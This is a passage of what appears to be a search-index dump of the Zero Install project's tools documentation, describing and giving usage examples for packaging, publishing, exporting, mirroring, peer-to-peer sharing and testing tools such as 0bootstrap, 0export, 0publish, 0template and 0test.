the release in your version control system and updating your Zero Install feed. 0repo 0repo helps you to maintain a repository of 0install software for others to use. It takes a new release generated by e.g. 0template or 0release and adds it to its collection. Then it generates a set of static files which you can upload to your web hosting provider. mkzero mkzero is a light-weight alternative to 0release. It doesn't support version control integration, tagging, or local feeds. It is useful for quickly publishing simple packages. 0template 0template generates the XML for one version of a program from a template. It is a useful replacement for 0downstream for more complex programs (e.g. source code that must be compiled or programs with dependencies). 0capture 0capture captures snapshots of system state and diffs them to generate Zero Install desktop integration. pkg2zero pkg2zero publishes a Debian or RPM package in a Zero Install feed. pom2feed The Zero Install Maven Integration connects the world of Zero Install with Apache Maven. With this project Zero Install gets access to the huge number of Java projects available at Maven Central. This is made possible by two components: the pom2feed-service and the pom2feed-maven-plugin."},{"location":"tools/#compiling","title":"Compiling","text":"0compile 0compile creates binaries from source code, either for your own use or ready for publishing on the web through Zero Install. It can use Zero Install to download any build dependencies (compilers, header files, build tools, etc). This is useful if there is no binary for your platform, or if you wish to modify the program in some way. Make-headers Make-headers is an extremely simple script for creating <code>-dev</code> packages (packages containing only header files) from ordinary source releases."},{"location":"tools/#testing","title":"Testing","text":"0test 0test runs the self-tests for a given program with various version combinations. FeedLint If you maintain a number of feeds, each with several versions of your programs, how do you know that all the download links are still OK? Run FeedLint on your feeds from time-to-time to check."},{"location":"tools/#sharing","title":"Sharing","text":"0export 0export creates a self-extracting installer for a given program, for distribution on CDs, etc. 0bootstrap 0bootstrap creates a native package that installs 0install and a given program 0mirror 0mirror keeps an archive of Zero Install feeds and GnuPG keys and exports them for publishing on a web-server. 0share 0share allows peer-to-peer sharing of Zero Install packages."},{"location":"tools/#security","title":"Security","text":"ebox ebox proof-of-concept sandboxing system."},{"location":"tools/0bootstrap/","title":"0bootstrap","text":"<p>0bootstrap generates a native package or installer that installs 0install itself along with a an app launched via 0install.</p> Linux / macOSWindows <p>Maintainer: Thomas Leonard License: GNU General Public License Source: https://github.com/0install/0bootstrap Zero Install feed: https://apps.0install.net/0install/0bootstrap.xml</p> <p>Warning</p> <p>The Linux version of this program is still experimental.</p> <p>Normally, a launcher is created by passing a feed URI to the \"Add Zero Install Program\" utility. This downloads the appropriate feeds, their icons - if available, and makes a shortcut (creates a launcher, a .desktop file).</p> <p>However, it is sometimes useful to bundle such a launcher and its icon together in a .deb package (for example), so that it can be installed on machines that don't have Zero Install available initially - by using the standard native package installation procedure.</p> <p>0bootstrap takes the URI of a program and creates a native package; currently the .deb and .rpm package formats are supported by the tool.</p> <p>Programs launched using these packages are added to the Zero Install cache and are therefore still shared between users, and will get updates over the web where possible.</p> <p>Maintainer: Bastian Eicher License: GNU Lesser General Public License Source: https://github.com/0install/0bootstrap-dotnet Zero Install feed: https://apps.0install.net/0install/0bootstrap.xml</p> <p>To setup 0bootstrap on your system you can run:</p> <pre><code>0install add 0bootstrap https://apps.0install.net/0install/0bootstrap.xml\n</code></pre> <p>You can then pass it a feed for which you'd like to create a bootstrapper as a command-line argument.</p> <p>Example</p> <pre><code>0bootstrap https://apps.0install.net/gui/vlc.xml\n</code></pre> <p>This will create a new file named <code>VLC media player.exe</code>, name taken from the <code>&lt;name&gt;</code> tag in the feed, in the current working directory. The file will have the VLC icon, taken from <code>&lt;icon&gt;</code> tag in the feed.</p> <p>By default, this bootstrapper will simply download 0install (if it is not already present) and then use it to run the feed. You can also configure the bootstrapper to perform desktop integration. You can use <code>--integrate-args=</code> to specify which arguments should be passed to <code>0install integrate</code>.</p> <p>Example</p> <pre><code>0bootstrap https://apps.0install.net/gui/vlc.xml --integrate-args=\"--add-standard\"\n</code></pre> <p>This causes the bootstrapper to run <code>0install integrate https://apps.0install.net/gui/vlc.xml --add-standard</code>, adding the app to the start menu and registering its supported file types.</p> <p>You can bundle the output of <code>0install export</code> into a bootstrapper to create a self-contained \"offline installer\" using <code>--content=</code>.</p> <p>Example</p> <pre><code>0install export https://apps.0install.net/gui/vlc.xml vlc-export\n0bootstrap https://apps.0install.net/gui/vlc.xml --content=vlc-export\\content\n</code></pre> <p>For further command-line arguments, see the output of <code>0bootstrap --help</code>.</p>"},{"location":"tools/0bootstrap/#using-a-0bootstrap-package","title":"Using a 0bootstrap package","text":"<p>Open the file with your file manager, or run <code>gdebi-gtk edit.deb</code> in a terminal:</p> <p></p> <p>The package will require Zero Install in order to install, as seen in the Details view:</p> <p></p> <p>Installing native packages requires authentication.</p> <p></p> <p>The installation will add the program to your menus.</p> <p></p>"},{"location":"tools/0bootstrap/#installing-0bootstrap","title":"Installing 0bootstrap","text":"<p>Since this program is not yet released, you need to run it from the source repository:</p> <pre><code>git clone git://zero-install.git.sourceforge.net/gitroot/zero-install/bootstrap\ncd bootstrap\n0install add-feed 0bootstrap.xml\n0install add 0bootstrap 0bootstrap.xml\n</code></pre>"},{"location":"tools/0bootstrap/#creating-a-package-for-your-program","title":"Creating a package for your program","text":"<p>Run 0bootstrap, passing in the package format and the name (URI) of the main program. For example, to create an Ubuntu package for Edit:</p> <pre><code>0bootstrap --format=deb http://rox.sourceforge.net/2005/interfaces/Edit\n</code></pre> <p>The resulting edit.deb package can now be installed on a Ubuntu machine.</p>"},{"location":"tools/0bootstrap/#faq","title":"FAQ","text":"What about security? Installing a package isn't a great way to make a shortcut. The normal Zero Install process of dragging a feed link to a trusted installation program is much better. However, distributions have been very slow to support this. 0bootstrap is an attempt to boot-strap the adoption process. The native package is required to work with the operating system's package installation tools, and can be automatically created by a web service given the feed's URI."},{"location":"tools/0capture/","title":"0capture","text":"<p>Maintainer: Bastian Eicher License: GNU Lesser General Public License Source: https://github.com/0install/0capture Zero Install feed: https://apps.0install.net/0install/0capture.xml</p> <p>0capture is a command-line tool for generating Zero Install feeds with metadata for desktop integration. This currently only works on Windows.</p> <p>To setup 0capture on your system you can run:</p> <pre><code>0install add 0capture https://github.com/0install/0capture\n</code></pre> <p>If you prefer a GUI, you can use the \"New Feed Wizard\" in the Windows version of 0publish-gui, which provides similar functionality.</p>"},{"location":"tools/0capture/#usage","title":"Usage","text":""},{"location":"tools/0capture/#first-snapshot","title":"First snapshot","text":"<p>First you need to capture a snapshot of the current state of your system by running:</p> <pre><code>0capture start myapp.snapshot\n</code></pre> <p>This will create a file named <code>myapp.snapshot</code> storing information such as the currently installed binaries, registered file handlers, etc..</p>"},{"location":"tools/0capture/#app-installation","title":"App installation","text":"<p>Now you can install the app you wish to capture using its regular installer.</p>"},{"location":"tools/0capture/#second-snapshot","title":"Second snapshot","text":"<p>Once the app is installed you can run:</p> <pre><code>0capture finish myapp.snapshot myapp.xml --collect-files=myapp.zip\n</code></pre> <p>This create another snapshot of the system state and compare it with the previously stored one. By comparing the two snapshot, 0capture can then infer which capabilities the app has and uses this to generate the feed file <code>myapp.xml</code> along with an archive containing the app's binaries named <code>myapp.zip</code>.</p>"},{"location":"tools/0capture/#faq","title":"FAQ","text":"Do I need to repeat this for each release of the app I captured? If the app provides non-installer archives, you can modify the feed to use those instead of the archive generated by <code>--collect-files</code>. Then you'll only need to run 0capture once to get the desktop integration capabilities. The generated feed seems to be missing some capabilities. How can I improve the quality of the generated feed? Try running 0capture and the app's installer in an otherwise pristine VM."},{"location":"tools/0export/","title":"0export","text":"Linux / macOSWindows <p>Maintainer: Thomas Leonard License: GNU General Public License Source: http://repo.or.cz/w/0export.git Zero Install feed: http://0install.net/tools/0export.xml</p> <p>0export creates self-installing bundles for distribution on CD, etc</p> <p>Normally, a program is run by passing its name (a URI) to the <code>0install run</code> command. This downloads the appropriate feeds, chooses a set of implementations (a version of the program, along with any libraries it needs) and downloads them too.</p> <p>However, it is sometimes useful to bundle a program and its libraries together on a CD (for example) so that it can be used on machines without a network connection, or where the network is very slow. It is also useful for archival purposes, in case the original web-sites supplying required libraries become unavailable.</p> <p>0export takes the URI of a program and creates a <code>setup.sh</code> file; a self-extracting archive containing everything needed to run the program. This file can be executed on a machine without a network connection to install or run the program.</p> <p>Programs installed using <code>setup.sh</code> are added to the 0install cache and are therefore still shared between users, and will get updates over the web where possible.</p> <p>If the target machine has network access, and you just want to provide a launcher script, consider instead using 0bootstrap-php, a PHP script that creates bootstrapping EXEs or bash scripts for installing 0install and then running a feed.</p> <p>This feature is built into Zero Install for Windows. See Export for details.</p>"},{"location":"tools/0export/#using-a-0export-package","title":"Using a 0export package","text":"<p>Open the file with your file manager, or run <code>sh setup.sh</code> in a terminal:</p> <p></p> <p>The archive will unpack and run:</p> <p></p> <p>You can add the program to your menus or run it directly.</p> <p></p>"},{"location":"tools/0export/#current-status","title":"Current status","text":"<p>This program is not yet complete. In particular, adding the program to the user's menus only works if the user already has 0install itself installed.</p>"},{"location":"tools/0export/#installing-0export","title":"Installing 0export","text":"<p>You can download <code>0export</code> and create a short-cut to it in the usual way:</p> <pre><code>0install add 0export http://0install.net/tools/0export.xml\n</code></pre>"},{"location":"tools/0export/#creating-a-setupsh-for-your-program","title":"Creating a setup.sh for your program","text":"<p>Run 0export, passing in the name of the installer file to create and the name (URI) of the main program. For example, to create an installer for Edit:</p> <pre><code>$ 0export setup.sh http://rox.sourceforge.net/2005/interfaces/Edit\n</code></pre> <p>The resulting <code>setup.sh</code> file can be copied to a CD and run on another machine. This machine does not need a network connection. It also does not need to have 0install installed on it before-hand.</p> <p>However, if the machine does have a network connection then the user will be notified of updates in the usual way.</p>"},{"location":"tools/0export/#format-of-the-setupsh","title":"Format of the setup.sh","text":"<p>The bulk of the <code>setup.sh</code> file is an archive containing:</p> <ul> <li>All feeds needed to run the program.</li> <li>All GPG keys signing the feeds.</li> <li>All selected implementations (versions).</li> <li>A copy of 0install, in case the target system doesn't have it.</li> <li>An installation script.</li> </ul> <p>To make the archive self-extracting, a short shell script is prepended to the archive which unpacks it to a temporary directory and then runs the installer. If you want to extract the files without executing anything, you can get the information you need from the first four lines of the script, which look like this:</p> <pre><code>#!/bin/sh\n## 0export 0.1\narchive_offset=00831\narchive_format=application/x-bzip-compressed-tar\n</code></pre>"},{"location":"tools/0export/#testing","title":"Testing","text":"<p>To test the installer:</p> <pre><code>$ sh setup.sh\n</code></pre> <p>The script currently (0export 0.1) does the following:</p> <ol> <li>Runs <code>gpg --import</code> on each GPG key in the archive, adding the keys that signed the feeds to your key-ring.</li> <li>Runs <code>0install import</code> on each feed in the archive. Every signing GPG key is added to the trusted list for the feed's domain. This allows checking for updates in future without confirming the keys. If the user already has a newer version of the feed, the import has no effect.</li> <li>Chooses a set of implementations (<code>0install select --xml URI</code>) in minimal network use mode and with the implementations in the <code>setup.sh</code> available.</li> <li>Copies any selected implementations into the system or user's cache (<code>~/.cache/0install.net/implementations</code>).</li> <li>Runs the program (<code>0install run --offline URI</code>).</li> </ol> <p>All steps use the bundled version of 0install.</p>"},{"location":"tools/0export/#support-for-multiple-architectures-or-multiple-applications-in-one-bundle","title":"Support for multiple architectures or multiple applications in one bundle","text":"<p>You can use the <code>--arch</code> option to set the target architecture(s). For example, this command will select two binaries for each component, one that will run on an <code>i586</code> machine and one that will run on an <code>x86_64</code> machine:</p> <pre><code>$ 0export --arch Linux-i586 --arch Linux-x86_64 setup.sh http://...\n</code></pre> <p>If a single binary is the best option for both then it will only be included in the bundle once. When the bundle is installed, only the required versions will be copied into the machine's cache.</p> <p>You can include multiple applications by listing multiple URIs. All applications will be added to the user's menu, but only the first will be run if the user selects the run option in the dialog. Note that dependencies are included automatically and should not be listed.</p>"},{"location":"tools/0export/#faq","title":"FAQ","text":"What about security? Running an executable isn't a great way to install a program. The normal 0install process of dragging a feed link to a trusted installation program is much better. However, distributions have been very slow to support this. 0export is an attempt to boot-strap the adoption process. The <code>setup.sh</code> script is designed to be easy to parse, so that in future it can be used as a simple archive. Why doesn't it confirm before trusting the keys? If the <code>setup.sh</code> is genuine then this is what you want. If it isn't, it's already too late. Even if the normal install script asked for confirmation, a malicious version could be modified to skip the check. One of many reasons why install scripts are a bad idea."},{"location":"tools/0mirror/","title":"0mirror","text":"<p>Maintainer: Thomas Leonard License: GNU General Public License Source: https://github.com/0install/0mirror.git</p> <p>With Zero Install, each software author publishes a feed on their web-site giving details about their software. Users can use these feeds to download the software and to receive notification of new versions. However, the author's site may become unavailable, either temporarily (e.g. due to network problems) or permanently (e.g. if the software is abandoned). Therefore, mirror sites are used to keep an up-to-date copy of the original feeds.</p> <p>Mirror sites can be public (such as the roscidus.com mirror), or internal to your organisation.</p> <p>0mirror takes a list of feed URLs and exports each one from your local Zero Install cache ready for publishing on a web-server (such as Apache). The published site contains:</p> <ul> <li>All known versions of the feed XML, with a symlink pointing to the most recent.</li> <li>All GPG keys used to sign the feeds.</li> <li>An Atom feed with news about the most recent changes.</li> </ul> <p>Note that it does not export the actual programs themselves, although that would certainly be useful for sites with plenty of bandwidth (which we don't have currently; sorry!).</p>"},{"location":"tools/0mirror/#status","title":"Status","text":"<p>0mirror is not yet officially released, although the GIT version works well enough to create the roscidus.com mirror. 0install 0.33 has built-in support for using the mirror service. On older versions, the GPG keys and feeds can be added manually (e.g. using <code>0install import feed.xml</code>).</p>"},{"location":"tools/0publish-gui/","title":"0publish-gui","text":"<p>Publishing a program using Zero Install requires you to create an XML file listing the available versions, where to get them, and what other software they depend on. This program provides a simple graphical interface for creating and editing these feeds.</p> Linux / macOSWindows <p>Maintainer: Thomas Leonard License: GNU Lesser General Public License Source: https://github.com/0install/0publish-gui Zero Install feed: https://apps.0install.net/0install/0publish-gui.xml</p> <p>See the packaging guide.</p> <p>Maintainer: Bastian Eicher License: GNU Lesser General Public License Source: https://github.com/0install/0publish-gui-dotnet Zero Install feed: https://apps.0install.net/0install/0publish-gui.xml</p> <p>0publish-gui for Windows (previously known as Zero Install Publishing Tools) provides a graphical feed editor and a new feed wizard.</p> <p>You can add 0publish-gui to your start menu like this:</p> <pre><code>0install integrate https://apps.0install.net/0install/0publish-gui.xml\n</code></pre>"},{"location":"tools/0publish-gui/#feed-editor","title":"Feed Editor","text":"<ul> <li>split with screen graphical and XML view</li> <li>changes in the graphical view are reflected in the XML view immediately and vice-versa</li> <li>syntax-highlighting and error-underlining in the XML view</li> </ul>"},{"location":"tools/0publish-gui/#new-feed-wizard","title":"New Feed Wizard","text":"<ul> <li>walks you through the entire feed creation process</li> <li>detects entry points (executables) in archives</li> <li>automatically creates appropriate <code>&lt;runner&gt;</code>s for Java, .NET and Python executables</li> <li>extracts metadata (name, version number, etc.) where possible</li> </ul>"},{"location":"tools/0publish/","title":"0publish","text":"<p><code>0publish</code> edits feed files in place. It loads the file, transforms it in some way (such as setting the release date, or adding a new implementation) and then writes it back out again. If the input file was signed, it will resign it when saving with the same key by default. You can also use it to add a signature, or to change the signing key.</p> <p>You can setup <code>0publish</code> like this:</p> <pre><code>0install add 0publish https://apps.0install.net/0install/0publish.xml\n</code></pre>"},{"location":"tools/0publish/#alternatives","title":"Alternatives","text":"<ul> <li>If you're looking for a graphical environment instead, see 0publish-gui.</li> <li>To add a new version of a program to a feed, consider using 0template to generate the XML for the new version and 0repo to add it to the master feed.</li> <li>0release provides a more complete solution for managing releases (0release uses 0publish or 0repo internally, but also handles many other aspects of making releases for you).</li> </ul> Linux / macOSWindows <p>Maintainer: Thomas Leonard License: GNU Lesser General Public License Source: https://github.com/0install/0publish Zero Install feed: https://apps.0install.net/0install/0publish.xml</p> <p>Maintainer: Bastian Eicher License: GNU Lesser General Public License Source: https://github.com/0install/0publish-dotnet Zero Install feed: https://apps.0install.net/0install/0publish.xml</p>"},{"location":"tools/0publish/#options","title":"Options","text":"<code>-h</code>, <code>--help</code> Show help message and exit. <code>-a FEED</code>, <code>--add-from=FEED</code> Add the implementation(s) in <code>FEED</code> to this one, putting them in the most sensible <code>&lt;group&gt;</code> (so as to minimise duplication of requirements, etc). <code>--add-types</code> add missing MIME-type attributes. <code>--add-version=VERSION</code> Add a new implementation (use with <code>--archive-url</code>, etc). <code>--archive-url=URL</code>, <code>--archive-file=FILE</code>, <code>--archive-extract=DIR</code> Change a local implementation to one with a digest and an archive. <code>-c</code>, <code>--create</code> Create a new feed file (if non-existent) without prompting. <code>-d ALG</code>, <code>--add-digest=ALG</code> Add extra digests using the given algorithm. <code>-e</code>, <code>--edit</code> Edit with <code>$EDITOR</code>. This is useful if the file is signed, since it removes the signature at the start and resigns at the end. It also checks that the new feed is valid before overwriting the old copy. <code>-g</code>, <code>--gpgsign</code> Add a GPG signature block. Deprecated; use <code>--xmlsign</code> instead. <code>-kKEY</code>, <code>--key=KEY</code> Key to use for signing (if you have more than one, or if you want to resign with a different key). <code>-lLOCAL</code>, <code>--local=LOCAL</code> Deprecated; use <code>--add-from</code> instead. <code>--manifest-algorithm=ALG</code> Select the algorithm to use for manifest digests. <code>--set-id=DIGEST</code> Set the implementation ID. Note: it's usually easier to use the <code>--archive-*</code> options, since they calculate the digest for you. <code>--set-main=EXEC</code> Set the main executable. <code>--set-arch=ARCH</code> Set the architecture. <code>--set-released=DATE</code> Set the release date. Typically used as <code>0publish --set-released $(date +%F) feed.xml</code>, which sets today's date. <code>--set-stability=STABILITY</code> Set the stability rating. <code>--set-version=VERSION</code> Set the version number (used when making a release from CVS). <code>-s</code>, <code>--stable</code> Mark the current testing version as stable. <code>--select-version=VERSION</code> Select version to use in <code>--set-*</code> commands. <code>-x</code>, <code>--xmlsign</code> Add an XML signature block. All remote feeds must be signed. <code>-u</code>, <code>--unsign</code> Remove any signature. <code>-v</code>, <code>--verbose</code> More verbose output (for debugging). <code>-V</code>, <code>--version</code> Display version information."},{"location":"tools/0publish/#faq","title":"FAQ","text":"<p>gpg: signing failed: secret key not available</p> <p>By default, 0publish tries to sign the new version of the feed using the same key that signed the old version. You will get this error if you don't have this key (e.g. because someone else signed the old version). In that case, use <code>-k</code> to specify they key you want to use instead.</p>"},{"location":"tools/0publish/#options_1","title":"Options","text":"<code>-h</code>, <code>--help</code> Show help message and exit. <code>--add-missing</code> Download missing archives, calculate manifest digests, etc.. <code>-x</code>, <code>--xmlsign</code> Add an XML signature block. All remote feeds must be signed. <code>-u</code>, <code>--unsign</code> Remove any signature. <code>-V</code>, <code>--version</code> Display version information."},{"location":"tools/0repo/","title":"0repo","text":"<p>Maintainer: Thomas Leonard License: GNU Lesser General Public License Source: https://github.com/0install/0repo Zero Install feed: https://apps.0install.net/0install/0repo.xml</p> <p>0repo provides an easy and reliable way to maintain a repository of 0install software for others to use.</p> <p>Figure 1 shows a simple deployment where a single developer provides a set of packages using 0install. The developer runs 0repo to create a repository on their local machine and <code>rsync</code>s the generated files to their static web hosting. To make a new release, the developer uses tools such as 0template or 0release to create a new release, which 0repo then adds to the repository.</p> <p></p> <p>Figure 1: Typical single-developer deployment of 0repo</p> <p>0repo is new and a little experimental, but feedback is welcome! We hope soon to support multi-developer deployments, where 0repo runs on a server and accepts contributions from a set of developers (as shown in figure 2).</p> <p></p> <p>Figure 2: Multi-developer deployment</p> <p>To get it:</p> <pre><code>0install add 0repo https://apps.0install.net/0install/0repo.xml\n</code></pre> <p>Full instructions can be found in 0repo's README.</p> <p>The packaging guide includes a short tutorial.</p>"},{"location":"tools/0share/","title":"0share","text":"<p>Maintainer: Thomas Leonard License: GNU General Public License Source: http://repo.or.cz/w/0share.git Zero Install feed: http://0install.net/2008/interfaces/0share.xml</p> <p>0share provides for local peer-to-peer distribution of Zero Install implementations (versions of programs). This means that once one machine on your local network has downloaded something, other machines can get it directly from the first one.</p> <p>This program is an experimental proof-of-concept. It currently requires a modified version of 0install, which can be found in the peer2peer branch. This branch is now very out-of-date. If you'd like to take over this project, please get in touch!</p> <p></p>"},{"location":"tools/0share/#testing","title":"Testing","text":"<p>To try it out, run this command on one machine:</p> <pre><code>machine1 $ 0install run http://0install.net/2008/interfaces/0share.xml\nINFO:root:0share started and listening for requests...\nINFO:root:Serving implementations from Store '/home/me/.cache/0install.net/implementations'\nINFO:root:Serving implementations from Store '/var/cache/0install.net/implementations'\n</code></pre> <p>On another machine on the same network, run this command, replacing <code>DIGEST</code> with the digest of a program installed on the first machine (e.g. the name of a subdirectory of <code>/var/cache/0install.net/implementations/</code>). The digest will be in the program's feed file.</p> <pre><code>machine2 $ 0install run http://0install.net/2008/interfaces/0share.xml -f DIGEST\n</code></pre> <p>The second machine will broadcast a request (to UDP port 38339) to see if anyone has the given implementation. The first machine should respond. The second machine will then fetch it from the first:</p> <pre><code>machine2 $ ./0share -f sha1new=84e37424bbb87a077e25cec87d3c668f12726817\nINFO:root:Broadcasting query for ['sha1new=84e37424bbb87a077e25cec87d3c668f12726817'] on local network...\n192.168.2.1 has sha1new=84e37424bbb87a077e25cec87d3c668f12726817\nINFO:root:Connecting to 192.168.2.1 to request sha1new=84e37424bbb87a077e25cec87d3c668f12726817\nINFO:root:Caching new implementation (digest sha1new=84e37424bbb87a077e25cec87d3c668f12726817)\nSuccess\n</code></pre> <p>The requested version should now be in machine2's cache. On the source machine, you should see something like:</p> <pre><code>INFO:root:Request from ('192.168.2.2', 53182): '0share\\nsha1new=84e37424bbb87a077e25cec87d3c668f12726817'\nINFO:root:Yes, we have sha1new=84e37424bbb87a077e25cec87d3c668f12726817\nINFO:root:Sending reply...\nINFO:root:GET /implementation/sha1new=84e37424bbb87a077e25cec87d3c668f12726817\nmachine2 - - [13/Dec/2008 21:52:49] \"GET /implementation/sha1new=84e37424bbb87a077e25cec87d3c668f12726817 HTTP/1.1\" 200 -\n</code></pre>"},{"location":"tools/0share/#debugging","title":"Debugging","text":"<p>If it doesn't work:</p> <ul> <li>Check that your firewall allows TCP and UDP connections to port 38339 on the first machine.</li> <li>Try using <code>-H</code> on the second machine to give the hostname of the first machine explicitly.</li> <li>If you get \"Network is unreachable\", you may be missing a default route (see <code>ip route</code>).</li> </ul>"},{"location":"tools/0share/#realistic-configuration","title":"Realistic configuration","text":"<p>Before you start, you should enable sharing on all machines. This ensures that implementations all go in the single machine-wide shared cache (<code>/var/cache/0install.net/implementations/</code>).</p> <p>You'll probably want to run 0share without write access anywhere (for security), so create a new user for that and try running it:</p> <pre><code>$ sudo adduser --system zeroshare\n$ sudo su zeroshare -s /usr/bin/env -- 0launch -vc http://0install.net/2008/interfaces/0share.xml\n</code></pre> <p>You can then add a line to your crontab file to make it start on boot:</p> <pre><code>@reboot zeroshare 0launch -vc http://0install.net/2008/interfaces/0share.xml 2&gt;&amp;1 &gt;/dev/null\n</code></pre>"},{"location":"tools/0share/#using-with-0launch","title":"Using with 0launch","text":"<p>As this is experimental, you'll need to use the peer2peer branch of 0install. In that branch, P2P support is turned on when using the GUI for downloads.</p>"},{"location":"tools/0template/","title":"0template","text":"<p>Maintainer: Thomas Leonard License: GNU Lesser General Public License Source: https://github.com/0install/0template Zero Install feed: https://apps.0install.net/0install/0template.xml</p> <p>0template creates the XML for one version of a program from a template. The diagram below shows how it fits into the overall publishing process:</p> <p></p> <p>That is, each time you want to add a new release of a program to your master XML feed, you first use 0template to generate the XML for the new release. Once you're happy with it, merge it into the master feed with 0repo.</p> <p>0template is mostly useful for publishing existing binary or source archives. If you are making releases of your own software from Git, consider using 0release instead.</p>"},{"location":"tools/0template/#installation","title":"Installation","text":"<p>To get it:</p> <pre><code>0install add 0template https://apps.0install.net/0install/0template.xml\n</code></pre>"},{"location":"tools/0template/#creating-the-template","title":"Creating the template","text":"<p>To start, run it with a non-existent file and it will offer to create it:</p> <pre><code>$ 0template myprog.xml.template\n'myprog.xml.template' does not exist; creating new template.\n\nDoes your program need to be compiled before it can be used?\n\n1) Generate a source template (e.g. for compiling C source code)\n2) Generate a binary template (e.g. for a pre-compiled binary or script)\n\n&gt; 2\n\nWriting myprog.xml.template\n</code></pre> <p>Then edit the generated <code>myprog.xml.template</code> to taste. A minimal example would be:</p> <pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"&gt;\n  &lt;name&gt;myprog&lt;/name&gt;\n  &lt;summary&gt;does useful stuff&lt;/summary&gt;\n\n  &lt;group&gt;\n    &lt;command name=\"run\" path=\"myprog\"/&gt;\n\n    &lt;implementation version=\"{version}\"&gt;\n      &lt;manifest-digest/&gt;\n      &lt;archive href=\"http://example.com/downloads/myprog-{version}.zip\"/&gt;\n    &lt;/implementation&gt;\n  &lt;/group&gt;\n&lt;/interface&gt;\n</code></pre> <p>You would typically want to add any dependencies here too. See the feed specification for details.</p> <p>Tip</p> <p>You can also use 0template to create a local feed to run a Git checkout, rather than an archive on the web. In that case, just don't use the <code>.template</code> extension, and it will generate a feed rather than a template.</p>"},{"location":"tools/0template/#using-the-template","title":"Using the template","text":"<p>To generate the XML for a particular version, run 0template on it and provide the template parameters (<code>version</code> in this example), e.g.</p> <pre><code>$ 0template myprog.xml.template version=1.0\nDownloading http://example.com/downloads/myprog-1.0.zip to ./myprog-1.0.zip\nWriting myprog-1.0.xml\n</code></pre> <p>You now have a feed with the appropriate details filled in:</p> <pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"&gt;\n  &lt;name&gt;myprog&lt;/name&gt;\n  &lt;summary&gt;does useful stuff&lt;/summary&gt;\n\n  &lt;group&gt;\n    &lt;command name=\"run\" path=\"myprog\"/&gt;\n\n    &lt;implementation id=\"sha1new=67ba178ed33b292efa5ab364d01a8fc13fe9eba3\" version=\"1.0\"&gt;\n      &lt;manifest-digest sha256new=\"FBXDJXLMHAPCRNZ5XOQTVYQHD6VP7CZAZ2UKCCV5UYE27C752GIQ\"/&gt;\n      &lt;archive extract=\"myprog-1.0\" href=\"http://example.com/downloads/myprog-1.0.zip\" size=\"352\"/&gt;\n    &lt;/implementation&gt;\n  &lt;/group&gt;\n&lt;/interface&gt;\n</code></pre> <p>Specifically, 0template fills in these values:</p> <ul> <li>All <code>{...}</code> text is expanded with the values you provided on the command-line.</li> <li>The archive is downloaded to the directory containing the feed, if it's not already there.</li> <li>The <code>size</code> attribute is set to the size of the archive.</li> <li>The <code>extract</code> attribute is set to the single top-level directory in the archive, if it has one.</li> <li>The <code>id</code> is set to the sha1new digest of the archive.</li> <li>Any empty attributes of <code>manifest-digest</code> are filled in with the calculated digests. If there are no attributes, a <code>sha256new</code> digest is added.</li> </ul> <p>You can now test this feed using e.g.</p> <pre><code>$ 0install run myprog-1.0.xml\n</code></pre> <p>Or, for source feeds:</p> <pre><code>$ 0compile autocompile myprog-1.0.xml\n</code></pre> <p>Once you are happy with it, you can add it to the master feed (which contains all versions) using 0repo. e.g.</p> <pre><code>$ 0repo add myprog-1.2.xml\n</code></pre> <p>The packaging guide includes a tutorial showing how to use 0template.</p>"},{"location":"tools/0test/","title":"0test","text":"<p>Maintainer: Thomas Leonard License: GNU General Public License Source: https://github.com/0install/0test Zero Install feed: https://apps.0install.net/0install/0test.xml</p> <p>A Zero Install feed can specify a \"test\" command, which can be run to test the program automatically. 0test runs this command. It can also test combinations of various versions of a program and its dependencies.</p> <p>Create a short-cut to it in the usual way:</p> <pre><code>0install add 0test https://apps.0install.net/0install/0test.xml\n</code></pre>"},{"location":"tools/0test/#usage","title":"Usage","text":"<p>Most simply, you can use it to run the tests for a program you have downloaded or checked out of version control. e.g.</p> <pre><code>$ git clone some-program\n$ 0test some-program/program.xml\n</code></pre> <p>You can also use it to test released programs, e.g. to test the default version of 0compile:</p> <pre><code>$ 0test https://apps.0install.net/0install/0compile.xml\nPassed\n - 0compile v0.21-post, ZeroInstall-Injector v0.51.1, 0publish v0.18-post, ROX-Lib2 v2.0.6-post\n</code></pre> <p>0test prints out the result and the versions of all components used in the test.</p> <p>You can specify a particular set of versions to test:</p> <pre><code>$ 0test https://apps.0install.net/0install/0compile.xml 0.26 0.27\nPassed\n - ZeroInstall-Injector v1.7 0compile v0.26, ROX-Lib2 v2.0.6, python v2.7.3, 0publish v0.20\n - ZeroInstall-Injector v1.7 0compile v0.27, ROX-Lib2 v2.0.6, python v2.7.3, 0publish v0.20\nNone skipped\nNone failed\n</code></pre> <p>A summary is printed at the end showing the result of each combination:</p> Passed the tests all passed successfully (the command returned an exit status of zero) Skipped this combination of versions can't be used together (or no tests are defined) Failed some tests failed (the self-test command returned a non-zero exit status) <p>You can specify versions of libraries the program depends on too. 0test will try all combinations. This tests three versions of 0compile against three versions of Zero Install (a total of 3 x 3 = 9 tests):</p> <pre><code>$ 0test --html results.html \\\n  https://apps.0install.net/0install/0compile.xml 0.19 0.20 0.21 \\\n  https://apps.0install.net/0install/0install-python.xml 0.47 0.48 0.49\nPassed\n - 0compile v0.20, ZeroInstall-Injector v0.48, 0publish v0.18-post, ROX-Lib2 v2.0.6-post\n - 0compile v0.20, ZeroInstall-Injector v0.49, 0publish v0.18-post, ROX-Lib2 v2.0.6-post\n - 0compile v0.21, ZeroInstall-Injector v0.48, 0publish v0.18-post, ROX-Lib2 v2.0.6-post\n - 0compile v0.21, ZeroInstall-Injector v0.49, 0publish v0.18-post, ROX-Lib2 v2.0.6-post\nSkipped\n - 0compile v0.21, ZeroInstall-Injector v0.47\nFailed\n - 0compile v0.19, ZeroInstall-Injector v0.47, 0publish v0.18-post, ROX-Lib2 v2.0.6-post\n - 0compile v0.19, ZeroInstall-Injector v0.48, 0publish v0.18-post, ROX-Lib2 v2.0.6-post\n - 0compile v0.19, ZeroInstall-Injector v0.49, 0publish v0.18-post, ROX-Lib2 v2.0.6-post\n - 0compile v0.20, ZeroInstall-Injector v0.47, 0publish v0.18-post, ROX-Lib2 v2.0.6-post\n</code></pre> <p>The <code>--html results.html</code> option causes it to also generate this table:</p> ZeroInstall-Injector 0compile 0.47 0.48 0.49 0.19 0publish 0.18-post ROX-Lib2 2.0.6-post 0publish 0.18-post ROX-Lib2 2.0.6-post 0publish 0.18-post ROX-Lib2 2.0.6-post 0.20 0publish 0.18-post ROX-Lib2 